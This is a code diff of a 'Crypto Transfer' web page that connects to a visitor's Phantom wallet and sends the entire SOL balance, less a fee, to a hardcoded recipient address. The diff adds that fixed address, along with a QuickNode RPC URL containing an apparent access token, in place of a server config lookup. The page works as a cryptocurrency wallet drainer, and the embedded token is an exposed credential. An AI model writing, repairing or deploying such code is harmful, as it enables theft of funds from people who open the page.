@@ -4,7 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.41.4/solanaWeb3.min.js"></script>
+    <!-- Correct Solana Web3.js library -->
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
 </head>
 <body>
     <h1>Click below to transfer all funds</h1>
@@ -18,35 +19,32 @@
             }
 
             try {
-                await window.solana.connect();
-                const publicKey = window.solana.publicKey;
+                // Connect to Phantom wallet
+                const response = await window.solana.connect();
+                const publicKey = response.publicKey;
+
                 if (!publicKey) {
                     throw new Error('Failed to get public key.');
                 }
 
-                // Fetch recipient and RPC URL from server
-                const response = await fetch('/api/config');
-                const config = await response.json();
-                const rpcUrl = config.rpcUrl;
-                const recipient = config.receiverWallet;
+                // Connect to Solana network
+                const connection = new solanaWeb3.Connection('https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df', 'confirmed');
 
-                if (!rpcUrl || !recipient) {
-                    throw new Error('Missing configuration. Please check your server setup.');
-                }
-
-                const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
+                // Check wallet balance
                 const balance = await connection.getBalance(publicKey);
 
-                if (balance <= 5000) { // Ensure enough for transaction fee
-                    alert('Insufficient SOL balance.');
+                if (balance <= 5000) {
+                    alert('Insufficient SOL balance to cover the transaction fee.');
                     return;
                 }
+
+                const recipient = '9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf';
 
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: publicKey,
                         toPubkey: new solanaWeb3.PublicKey(recipient),
-                        lamports: balance - 5000 // Subtract estimated transaction fee
+                        lamports: balance - 5000 // Subtracting estimated transaction fee
                     })
                 );
 
@@ -54,13 +52,15 @@
                 const { blockhash } = await connection.getLatestBlockhash();
                 transaction.recentBlockhash = blockhash;
 
+                // Sign the transaction
                 const signedTransaction = await window.solana.signTransaction(transaction);
                 const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+
                 await connection.confirmTransaction(signature);
 
-                alert(`Transaction successful! Signature: ${signature}`);
+                alert(`Transaction successful: ${signature}`);
             } catch (error) {
-                console.error('Transaction Error:', error);
+                console.error('Transaction failed:', error);
                 alert(`Transaction failed: ${error.message}`);
             }
         });
